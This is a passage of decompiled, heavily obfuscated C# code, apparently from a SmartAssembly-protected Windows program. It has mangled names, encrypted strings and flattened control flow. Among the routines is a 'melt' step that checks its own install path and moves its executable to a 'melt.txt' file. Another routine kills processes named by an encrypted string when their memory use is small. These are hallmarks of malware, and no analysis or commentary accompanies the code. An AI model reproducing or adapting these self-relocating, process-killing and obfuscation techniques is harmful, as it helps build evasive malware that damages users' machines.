      obj0.\u0023xh.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      obj0.\u0023xh.FlatStyle = FlatStyle.System;
      obj0.\u0023xh.Location = new Point(146, 197);
      num1 = 3;
      continue;
label_66:
      obj0.\u0023wh = new Button();
      num1 = 38;
      continue;
label_67:
      obj0.\u0023ch = new Panel();
      obj0.\u0023dh = new Button();
      obj0.\u0023jh = new Button();
      num1 = 2;
      continue;
label_68:
      obj0.\u0023lh = new \u00232f();
      obj0.\u0023rf = new \u0023Ef();
      num1 = 8;
      continue;
label_70:
      obj0.\u0023Se.TabIndex = 9;
      obj0.\u0023Se.Text = "&Send Error Report";
      obj0.\u0023Se.Click += new EventHandler(obj0.\u0023zh);
      num1 = 57;
    }
label_54:
    return;
label_73:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023jl([In] short[] obj0, [In] byte[] obj1, [In] \u0023qc.\u0023md.\u0023Pc obj2)
  {
    try
    {
      obj2.\u0023rd = obj0;
      obj2.\u0023od = obj1;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023md.\u0023Pc pc = obj2;
      short[] numArray1 = obj0;
      byte[] numArray2 = obj1;
      \u0023\u0023.\u0023Dj(ex, (object) pc, (object) numArray1, (object) numArray2);
      throw;
    }
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023kl([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [DllImport("user32", EntryPoint = "DrawText", CharSet = CharSet.Unicode)]
  internal static extern int \u0023ll(
    [In] IntPtr obj0,
    [In] string obj1,
    [In] int obj2,
    [In] ref \u0023Z.\u0023Dg obj3,
    [In] int obj4);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static Exception \u0023ml([In] \u0023hf obj0) => obj0.\u0023bf;

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023nl([In] \u0023qc.\u0023Mc obj0)
  {
    try
    {
      obj0.\u0023Kc >>= obj0.\u0023Lc & 7;
      obj0.\u0023Lc &= -8;
    }
    catch (Exception ex)
    {
      \u0023qc.\u0023Mc mc = obj0;
      \u0023\u0023.\u0023Oj(ex, (object) mc);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static string \u0023ol() => "SmartAssembly";

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023pl([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3, [In] object obj4) => \u0023\u0023.\u0023ji(obj0, new object[4]
  {
    obj1,
    obj2,
    obj3,
    obj4
  });

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023ql([In] \u0023Te obj0, [In] string obj1)
  {
    try
    {
      byte[] numArray1 = obj0.\u0023Pe();
      byte[] numArray2;
      try
      {
        numArray2 = \u0023\u0023.\u0023Aj(numArray1);
      }
      catch
      {
        numArray2 = (byte[]) null;
      }
      byte[] buffer = \u0023\u0023.\u0023Jj(numArray2, "<RSAKeyValue><Modulus>qS9bcjtpTT7xWoO9DQlEynGMz3EMZxwxKDo7J070pAtydKkLKOlTyoBdOeGAO5iPEVeLi7CjJLotcQvgmTkah18f+jtEyf9SkwCj2ayy/BG7+yoII48H2MPVx1gJq0Ox0PZ1qRm1Sj0hegQqCf5OxZ9jfcSNYqlsPze95NZqj0s=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
      FileStream fileStream = System.IO.File.OpenWrite(obj1);
      byte[] bytes = Encoding.ASCII.GetBytes("{528C9DDA-94F5-4688-B6FB-056FFA07C362}");
      fileStream.Write(bytes, 0, bytes.Length);
      fileStream.Write(buffer, 0, buffer.Length);
      fileStream.Close();
      return true;
    }
    catch (ThreadAbortException ex)
    {
      return false;
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023rl([In] \u0023Ef obj0)
  {
    try
    {
      using (Graphics graphics = obj0.CreateGraphics())
      {
        string text = obj0.Text;
        int num1 = 1;
        int num2;
        while (true)
        {
          int num3 = num1;
          Font font;
          int width;
          while (true)
          {
            switch (num3)
            {
              case 0:
              case 1:
                font = obj0.Font;
                if (true)
                {
                  num3 = 3;
                  continue;
                }
                goto label_9;
              case 2:
              case 4:
                num2 = \u0023\u0023.\u0023hj(text, font, width, graphics);
                if (num2 > 0)
                {
                  if (true)
                  {
                    num3 = 5;
                    continue;
                  }
                  goto case 3;
                }
                else
                  goto label_10;
              case 3:
                width = obj0.Width;
                goto case 2;
              case 5:
                goto label_9;
              default:
                goto label_7;
            }
          }
label_7:
          num1 = 4;
        }
label_10:
        return;
label_9:
        obj0.Height = num2;
      }
    }
    catch
    {
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023sl([In] \u0023qc.\u0023Sc obj0, [In] \u0023qc.\u0023Mc obj1)
  {
    int index;
    int num1;
    int num2;
    int num3;
    int num4;
    int num5;
    int num6;
    try
    {
      int num7;
      if ((index = \u0023\u0023.\u0023cj(obj1, 9)) >= 0)
      {
        num7 = 2;
      }
      else
      {
        num2 = \u0023\u0023.\u00239h(obj1);
        index = \u0023\u0023.\u0023cj(obj1, num2);
        num7 = 5;
      }
      while (true)
      {
        switch (num7)
        {
          case 0:
          case 2:
            if ((num3 = (int) obj0.\u0023Pc[index]) < 0)
            {
              num5 = -(num3 >> 4);
              num6 = num3 & 15;
              if ((index = \u0023\u0023.\u0023cj(obj1, num6)) < 0)
              {
                num4 = \u0023\u0023.\u00239h(obj1);
                goto case 3;
              }
              else
              {
                num7 = 4;
                continue;
              }
            }
            else
              goto label_12;
          case 1:
            num1 = num3 >> 4;
            num7 = 7;
            continue;
          case 3:
            index = \u0023\u0023.\u0023cj(obj1, num4);
            num3 = (int) obj0.\u0023Pc[num5 | index >> 9];
            if ((num3 & 15) <= num4)
            {
              \u0023\u0023.\u0023Ui(obj1, num3 & 15);
              num1 = num3 >> 4;
              num7 = 8;
              continue;
            }
            goto label_2;
          case 4:
            num3 = (int) obj0.\u0023Pc[num5 | index >> 9];
            \u0023\u0023.\u0023Ui(obj1, num3 & 15);
            num7 = 1;
            continue;
          case 5:
          case 6:
            num3 = (int) obj0.\u0023Pc[index];
            if (num3 >= 0 && (num3 & 15) <= num2)
            {
              \u0023\u0023.\u0023Ui(obj1, num3 & 15);
              num1 = num3 >> 4;
              num7 = 9;
              continue;
            }
            goto label_17;
          case 7:
          case 8:
          case 9:
            goto label_19;
          default:
            num7 = 3;
            continue;
        }
      }
label_2:
      num1 = -1;
      goto label_19;
label_12:
      \u0023\u0023.\u0023Ui(obj1, num3 & 15);
      num1 = num3 >> 4;
      goto label_19;
label_17:
      num1 = -1;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) index;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num5;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num6;
      // ISSUE: variable of a boxed type
      __Boxed<int> local5 = (ValueType) num4;
      // ISSUE: variable of a boxed type
      __Boxed<int> local6 = (ValueType) num2;
      \u0023qc.\u0023Sc sc = obj0;
      \u0023qc.\u0023Mc mc = obj1;
      \u0023\u0023.\u0023Rk(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) sc, (object) mc);
      throw;
    }
label_19:
    return num1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static bool \u0023tl([In] byte[] obj0, [In] \u0023ge obj1, [In] \u0023ge.\u0023ue obj2)
  {
    int num1 = 5;
    \u0023ge.\u0023ne ne;
    while (true)
    {
      int num2 = num1;
      \u0023wg wg;
      byte[] numArray1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
            byte[] numArray2;
            try
            {
              numArray2 = \u0023\u0023.\u0023Aj(obj0);
            }
            catch (Exception ex)
            {
              \u0023\u0023.\u0023bi(obj1, \u0023yf.\u0023uf, \u0023qc.\u0023pc);
              return false;
            }
            numArray1 = \u0023\u0023.\u0023Jj(numArray2, "<RSAKeyValue><Modulus>qS9bcjtpTT7xWoO9DQlEynGMz3EMZxwxKDo7J070pAtydKkLKOlTyoBdOeGAO5iPEVeLi7CjJLotcQvgmTkah18f+jtEyf9SkwCj2ayy/BG7+yoII48H2MPVx1gJq0Ox0PZ1qRm1Sj0hegQqCf5OxZ9jfcSNYqlsPze95NZqj0s=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
            if (true)
            {
              num2 = 4;
              continue;
            }
            goto label_10;
          case 1:
          case 4:
            if (numArray1 != null)
            {
              \u0023\u0023.\u0023bi(obj1, \u0023yf.\u0023vf);
              goto case 6;
            }
            else
              goto label_6;
          case 2:
            goto label_10;
          case 3:
            goto label_1;
          case 6:
            wg = new \u0023wg("d98c1dd4-008f-04b2-e980-0998ecf8427e");
            if (obj1.\u0023ee != null)
              wg.\u0023vg = obj1.\u0023ee;
            ne = new \u0023ge.\u0023ne(obj1, numArray1, wg, obj2);
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 3;
              continue;
            }
            goto case 1;
          case 7:
            goto label_15;
          default:
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num2 = 6;
              continue;
            }
            goto label_15;
        }
      }
label_1:
      \u0023\u0023.\u0023ci(new \u0023Af(ne.\u0023me), wg);
      num1 = 7;
      continue;
label_6:
      num1 = 2;
    }
label_10:
    \u0023\u0023.\u0023bi(obj1, \u0023yf.\u0023uf, \u0023ce.\u0023pc);
    return false;
label_15:
    return ne.\u0023le;
  }

  [DllImport("mscorwks.dll", EntryPoint = "StrongNameSignatureVerificationEx", CharSet = CharSet.Unicode)]
  [return: MarshalAs(UnmanagedType.Bool)]
  internal static extern bool \u0023ul([MarshalAs(UnmanagedType.LPWStr)] string _param0, [MarshalAs(UnmanagedType.Bool)] bool _param1, [MarshalAs(UnmanagedType.Bool)] out bool _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023vl()
  {
label_0:
    int num1;
    int num2;
    string str1;
    string str2;
    object executablePath;
    bool flag;
    int num3;
    try
    {
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        num2 = 2;
        str1 = Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
label_2:
        num2 = 3;
        str2 = "" + Interaction.Environ(\u0023\u0023.\u0023ei("5g+BxFHXkdTcEM3cEGgk0A==")) + \u0023\u0023.\u0023ei("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=") + "";
label_3:
        num2 = 4;
        executablePath = (object) Application.ExecutablePath;
label_4:
        num2 = 5;
        flag = false;
label_5:
        num2 = 6;
        if (!Operators.ConditionalCompareObjectEqual(executablePath, (object) (str1 + \u0023\u0023.\u0023ei("GnEv8+RLHTy6DbiOjusZHA==") + "\\" + \u0023\u0023.\u0023ei("/Ua4ADIj2BcZDlY+KZNNuw==")), false))
          goto label_7;
label_6:
        num2 = 7;
        flag = true;
label_7:
        num2 = 9;
        if (flag)
          goto label_16;
label_8:
        num2 = 12;
label_9:
        num2 = 13;
        System.IO.File.Delete(str2 + "melt.txt");
label_10:
        num2 = 14;
        System.IO.File.Move(Application.ExecutablePath, str2 + "melt.txt");
        goto label_16;
label_12:
        num3 = num2;
        switch (num1)
        {
          case 1:
            int num4 = num3 + 1;
            num3 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
              case 9:
                goto label_7;
              case 10:
              case 11:
              case 15:
              case 16:
                goto label_16;
              case 12:
                goto label_8;
              case 13:
                goto label_9;
              case 14:
                goto label_10;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num3 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_16:
      if (num3 == 0)
        return;
      ProjectData.ClearProjectError();
    }
    catch (Exception ex)
    {
      object obj = executablePath;
      string str3 = str1;
      string str4 = str2;
      // ISSUE: variable of a boxed type
      __Boxed<bool> local1 = (ValueType) flag;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) num3;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) num2;
      \u0023\u0023.\u00233k(ex, obj, (object) str3, (object) str4, (object) local1, (object) local2, (object) local3, (object) local4);
      throw;
    }
  }

  [DllImport("wldap32.dll", EntryPoint = "ldap_modrdn", CharSet = CharSet.Ansi, SetLastError = true)]
  internal static extern long \u0023wl(ref \u0023N _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  static int \u0023xl([In] byte[] obj0, [In] int obj1, [In] \u0023qc.\u0023Gc obj2, [In] int obj3)
  {
    int num1;
    int num2;
    try
    {
      num1 = 0;
label_1:
      int num3;
      if (obj2.\u0023wc != 11)
      {
        num3 = 3;
        goto label_11;
      }
      else
        goto label_6;
label_3:
      obj3 -= num2;
      if (obj3 == 0)
      {
        int num4 = 4;
        num3 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num4 : num4;
        goto label_11;
      }
label_6:
      if (!\u0023\u0023.\u0023fk(obj2))
      {
        if (\u0023\u0023.\u0023gi(obj2.\u0023Cc) > 0)
        {
          if (obj2.\u0023wc == 11)
          {
            num3 = 6;
            if (true)
              goto label_11;
          }
          else
            goto label_1;
        }
        else
          goto label_14;
      }
      else
        goto label_1;
label_10:
      num1 += num2;
      goto label_3;
label_11:
      while (true)
      {
        switch (num3)
        {
          case 0:
          case 2:
            goto label_3;
          case 1:
          case 5:
            goto label_10;
          case 3:
            num2 = \u0023\u0023.\u0023Zh(obj1, obj0, obj2.\u0023Cc, obj3);
            obj1 += num2;
            if (\u0023\u0023.UBSgn55zIxbZDXest3e())
            {
              num3 = 5;
              continue;
            }
            goto label_14;
          case 4:
            goto label_5;
          case 6:
            goto label_14;
          default:
            int num5 = 0;
            num3 = \u0023\u0023.XPxp2PwLL1BPJh1nWga() ? num5 : num5;
            continue;
        }
      }
label_5:
      return num1;
label_14:
      return num1;
    }
    catch (Exception ex)
    {
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) num1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num2;
      \u0023qc.\u0023Gc gc = obj2;
      byte[] numArray = obj0;
      // ISSUE: variable of a boxed type
      __Boxed<int> local3 = (ValueType) obj1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local4 = (ValueType) obj3;
      \u0023\u0023.\u0023uk(ex, (object) local1, (object) local2, (object) gc, (object) numArray, (object) local3, (object) local4);
      throw;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  static void \u0023yl()
  {
    Process[] processesByName;
    int num1;
    int index;
    Exception exception1;
    try
    {
      processesByName = Process.GetProcessesByName("qJ1rx6zo0JWv6cXezCyOGQ== ");
      if (processesByName.Length <= 0)
        return;
      num1 = checked (processesByName.Length - 1);
      index = 0;
      while (index <= num1)
      {
        if (!processesByName[index].HasExited)
        {
          if ((double) processesByName[index].WorkingSet64 / 1024.0 < 130.0)
          {
            try
            {
              processesByName[index].Kill();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              exception1 = ex;
              int num2 = (int) MessageBox.Show(exception1.Message);
              ProjectData.ClearProjectError();
            }
          }
        }
        checked { ++index; }
      }
    }
    catch (Exception ex)
    {
      Process[] processArray = processesByName;
      // ISSUE: variable of a boxed type
      __Boxed<int> local1 = (ValueType) index;
      Exception exception2 = exception1;
      // ISSUE: variable of a boxed type
      __Boxed<int> local2 = (ValueType) num1;
      \u0023\u0023.\u0023pl(ex, (object) processArray, (object) local1, (object) exception2, (object) local2);
      throw;
    }
  }

  internal static bool UBSgn55zIxbZDXest3e() => true;

  internal static bool XPxp2PwLL1BPJh1nWga() => false;
}
